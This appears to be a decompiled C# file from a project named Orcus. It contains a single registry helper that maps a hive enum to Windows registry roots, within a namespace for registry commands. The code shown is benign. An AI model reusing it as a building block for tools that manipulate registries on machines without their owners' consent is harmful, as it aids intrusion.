using System;
using Microsoft.Win32;
using Orcus.Shared.Commands.Registry;

namespace Orcus.Extensions;

internal static class RegistryExtensions
{
	public static RegistryKey OpenRegistry(RegistryHive registryHive)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected I4, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		return (int)registryHive switch
		{
			0 => Registry.ClassesRoot, 
			1 => Registry.CurrentUser, 
			2 => Registry.LocalMachine, 
			3 => Registry.Users, 
			4 => Registry.CurrentConfig, 
			_ => throw new ArgumentOutOfRangeException("registryHive", registryHive, null), 
		};
	}
}
